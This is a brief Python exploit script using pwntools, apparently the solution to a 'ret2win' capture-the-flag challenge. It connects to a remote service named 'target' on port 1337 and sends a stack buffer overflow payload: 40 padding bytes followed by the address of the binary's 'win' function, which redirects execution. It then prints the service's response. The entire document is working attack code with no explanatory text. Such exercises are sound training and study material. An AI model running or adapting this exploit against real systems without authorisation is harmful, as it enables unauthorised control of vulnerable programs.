from pwn import *
context.log_level = "error"
e = ELF("./ret2win")
p = remote("target", 1337)
p.recvline()
p.send(b"A" * 40 + p64(e.symbols["win"]))
print(p.recvall(timeout=5).decode(errors="replace"))
